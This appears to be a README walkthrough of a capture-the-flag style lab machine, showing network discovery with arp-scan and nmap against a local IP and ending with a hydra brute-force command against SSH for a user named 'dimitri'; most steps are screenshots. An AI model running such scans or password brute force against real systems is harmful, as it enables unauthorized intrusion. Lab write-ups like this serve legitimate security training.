<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/d85d1e02-a6f5-4b24-aaa5-caf437e6d01f"></picture></h1>

## **Visualization of our network card**
```bash
ifconfig
```
![image](https://github.com/user-attachments/assets/f33d0347-0390-4371-9536-5b1f2a0558ed)

## **Scanning our network to find connected devices**
```
arp-scan -I eth0 --localnet --ignoredups
```
![image](https://github.com/user-attachments/assets/d80884f7-3ad7-40c9-80c1-777115ab4438)

## **Discovering**
```bash
ping -c 192.168.1.220
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.220 -oG allports
nmap -sCV -p22,80 192.168.1.220 -oN targeted
```
![image](https://github.com/user-attachments/assets/df901688-8e24-46e8-b9e5-169d7845111a)

## **PORT 80**
![image](https://github.com/user-attachments/assets/204f1f8b-e815-427e-9c62-c20526874788)

## **PORT 631**
![image](https://github.com/user-attachments/assets/22bb40bd-8097-4ddb-be34-a02d44c94719)

## **Fuzzing Web**
![image](https://github.com/user-attachments/assets/f4e83a33-0334-4246-9a65-858b34a20bf4)
No hidden directories found

## **On the web through port 631 we find a user**
![image](https://github.com/user-attachments/assets/5371ec34-bfb1-44d9-bb44-9e3c123a5d5a)

## **We apply brute force to the SSH service with the found user**
```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.220
```






